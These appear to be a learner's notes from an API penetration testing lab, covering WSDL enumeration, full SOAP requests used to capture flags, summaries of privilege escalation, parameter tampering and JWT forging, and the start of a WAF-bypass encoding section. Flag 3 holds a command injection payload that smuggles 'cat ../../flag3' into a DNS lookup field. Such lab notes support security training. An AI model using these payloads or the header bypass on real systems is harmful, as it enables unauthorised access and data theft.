
# API Penetration Testing
## Enumeration
### WSDL disclosure and Method Enumeration 
The first step in web service testing is accessing WSDL file disclosure.(Because it would give us a full list of operation , methods, and so on)
*How?* By adding `?wsdl` or `.wsdl` and `?disco`

*Note*: When we have a list of all operations listed on a web application. it may not be all, so we needed to  get the thorough operations by reading the WSDL file. Make requests with ChatGPT.

## Injection Attacks
It is primary the same with a little bit of changes.
### Flag 1:
```
POST /webservices/soap/ws-user-account.php HTTP/1.1
Host: demo.ine.local
Content-Type: text/xml;charset=UTF-8
SOAPAction: "urn:ws-user-account#deleteUser"
Connection: close
Content-Length: 565

<soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
                  xmlns:xsd="http://www.w3.org/2001/XMLSchema"
                  xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
                  xmlns:urn="urn:ws-user-account">
  <soapenv:Header/>
  <soapenv:Body>
    <urn:deleteUser soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
      <username xsi:type="xsd:string">Joe2</username>
      <password xsi:type="xsd:string">Holly</password>
    </urn:deleteUser>
  </soapenv:Body>
</soapenv:Envelope>
```

### Flag 2:
In SOAP APIs there might be two permission checks, 1. Operation check 2, Header Check
So, in order to get the second flag, we make the request with the bellow header to bypass the restrictions
```
SOAPAction: "urn:ws-user-account#getAdminInfo"
```
### Flag 3:
```
POST /webservices/soap/ws-lookup-dns-record.php HTTP/1.1
Accept-Encoding: gzip,deflate
Content-Type: text/xml;charset=UTF-8
SOAPAction: "urn:commandinjwsdl#commandinj"
Content-Length: 461
Host: localhost
Connection: Keep-Alive
User-Agent: Apache-HttpClient/4.1.1 (java 1.5)

<soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:urn="urn:commandinjwsdl">
<soapenv:Header/>
<soapenv:Body>
<urn:lookupDNS soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
<targetHost xsi:type="xsd:string">www.google.com;cat ../../flag3;</targetHost>
</urn:lookupDNaS>
</soapenv:Body>
</soapenv:Envelope>
```

## API Security Testing
### Misconfigured Permissions
- The user has access to add a user, but the permission was loosy. So, i was able to add a new user with role=1 and i got admin level access. Done
### Improper Input Validation
- The user was able to send my to their friends, so we replace the emails and send the money to ourselves. After that, the flag can be bought. Done.
### Parameter Tampering
- It was a shopping application. I edit the price, and bypassed the restrictions. Done.
### Security Misconfiguration
- The backend API was vulnerable to directory listing. So, we found a app.py which was disclosing the jwt secret. We forged our own token with role=admin to become admin, and charged ourselfs money. I got the flag. Done.

# # Filter Evasion & WAF Bypass Techniques
## Encoding
#### Charset:
Defines how textual data is mapped to binary values in computing system. E,g: ASCII, Unicode, Latin-1
##### ASCII
It’s a **character encoding system** used by computers to represent text (letters, numbers, and symbols) as numbers.
128 characters, or 2\*\*7 conversions
##### Unicode
is a universal character encoding system designed to represent text from **all languages and symbol systems** in a consistent way.
Unicode itself is a system, but it’s stored using formats like:

- **UTF-8** (most common, used on the web)
- **UTF-16**
- **UTF-32**


